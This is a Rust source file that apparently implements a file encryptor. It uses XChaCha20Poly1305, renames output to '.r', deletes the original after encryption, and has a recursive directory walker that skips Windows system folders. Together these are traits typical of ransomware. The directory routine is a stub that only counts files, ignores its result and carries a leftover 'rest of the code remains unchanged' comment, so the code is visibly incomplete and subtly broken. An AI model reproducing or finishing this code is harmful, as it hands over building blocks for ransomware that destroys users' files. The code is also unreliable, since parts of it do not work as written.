use std::io::{Write, Read, self, stdout};
use std::fs::{File, self};
use anyhow::{anyhow, Result};
use chacha20poly1305::{aead::{stream, NewAead}, XChaCha20Poly1305,};
use std::path::{Path};

pub fn encrypt(
  key: &[u8; 32],
  nonce: &[u8; 19],
) -> Result<(), anyhow::Error> {
  print!("    File to encrypt: ");
  io::stdout().flush().unwrap();
  let mut source_file_path = String::new();
  io::stdin().read_line(&mut source_file_path)?;
  let source_file_path = source_file_path.trim();

  let mut dist_file_path = String::from(source_file_path);
  dist_file_path.push_str(".r");

  let aead = XChaCha20Poly1305::new(key.as_ref().into());
  let mut stream_encryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());

  const BUFFER_LEN: usize = 500;
  let mut buffer = [0u8; BUFFER_LEN];

  let mut source_file = File::open(source_file_path)?;
  let mut dist_file = File::create(&dist_file_path)?;

  // if the source file is a directory, encrypt all files in it including subdirectories
  if source_file.metadata()?.is_dir() {
    let dir = Path::new(source_file_path);
    let mut counter = 1;
    encrypt_dir(dir, &mut dist_file, &mut counter);
  } else {
    loop {
      let read_count = source_file.read(&mut buffer)?;

      if read_count == BUFFER_LEN {
        let ciphertext = stream_encryptor
          .encrypt_next(buffer.as_slice())
          .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
        dist_file.write(&ciphertext)?;
      } else {
        let ciphertext = stream_encryptor
          .encrypt_last(&buffer[..read_count])
          .map_err(|err| anyhow!("Encrypting large file: {}", err))?;
        dist_file.write(&ciphertext)?;
        break;
      }
    }
  }
  std::fs::remove_file(source_file_path)?;
  Ok(())
}

pub fn decrypt(key: &[u8; 32], nonce: &[u8; 19]) -> Result<(), anyhow::Error> {
  print!("    File to decrypt: ");
  io::stdout().flush().unwrap();
  let mut encrypted_file_path = String::new();
  io::stdin().read_line(&mut encrypted_file_path)?;
  let encrypted_file_path = encrypted_file_path.trim();

  let mut dist_file_path = encrypted_file_path.to_string();
  if dist_file_path.ends_with(".r") {
    dist_file_path.pop();
  }

  let aead = XChaCha20Poly1305::new(key.as_ref().into());
  let mut stream_decryptor = stream::DecryptorBE32::from_aead(aead, nonce.as_ref().into());

  const BUFFER_LEN: usize = 500 + 16;
  let mut buffer = [0u8; BUFFER_LEN];

  let mut encrypted_file = File::open(encrypted_file_path)?;
  let mut dist_file = File::create(&dist_file_path)?;

  loop {
    let read_count = encrypted_file.read(&mut buffer)?;

    if read_count == BUFFER_LEN {
      let plaintext = stream_decryptor
        .decrypt_next(buffer.as_slice())
        .map_err(|err| {
          std::fs::remove_file(&dist_file_path).unwrap();
          anyhow!("Decrypting large file: {}", err)
        })?;
      dist_file.write(&plaintext)?;
    } else if read_count == 0 {
        break;
    } else {
      let plaintext = stream_decryptor
        .decrypt_last(&buffer[..read_count])
        .map_err(|err| {
          std::fs::remove_file(&dist_file_path).unwrap();
          anyhow!("Decrypting large file: {}", err)
        })?;
      dist_file.write(&plaintext)?;
      break;
    }
  }
  std::fs::remove_file(encrypted_file_path).unwrap();
  Ok(())
}

fn encrypt_dir(dir: &Path, file: &mut File, counter: &mut i32) -> Result<(), Box<dyn std::error::Error>> {
  print!("        Scanned {} files {}\r", counter, " ".repeat(10));
  stdout().flush().unwrap();

  // The rest of the code remains unchanged
  let blacklisted_dirs: Vec<String> = vec![
    "C:\\Windows".to_string(), 
    "C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages".to_string(),
    "C:\\Users\\All Users".to_string(),
    "C:\\Documents and Settings".to_string(),
    "C:\\ProgramData\\Application Data".to_string(),
    "C:\\ProgramData\\Desktop".to_string(),
    "C:\\ProgramData\\Documents".to_string(),
    "C:\\ProgramData\\Start Menu".to_string(),
    "C:\\ProgramData\\Templates".to_string(),
    "C:\\Users\\Default".to_string(),
  ];
  if !blacklisted_dirs.contains(&dir.to_string_lossy().to_string()) {
    match fs::read_dir(dir) {
      Ok(entries) => {
        for entry in entries.filter_map(|e| e.ok()) {
          let path = entry.path();
          if path.is_file() {
              
              
            *counter += 1;
          } else if path.is_dir() {
            encrypt_dir(&path, file, counter)?;
          }
        }
        Ok(())
      } 
      Err(e) => {
        let mut log_file = File::create("error.log").unwrap();
        writeln!(log_file, "Error reading directory {}: {}", dir.display(), e).unwrap();
        Ok(())
      }
    }
  } else {
    Ok(())
  }
}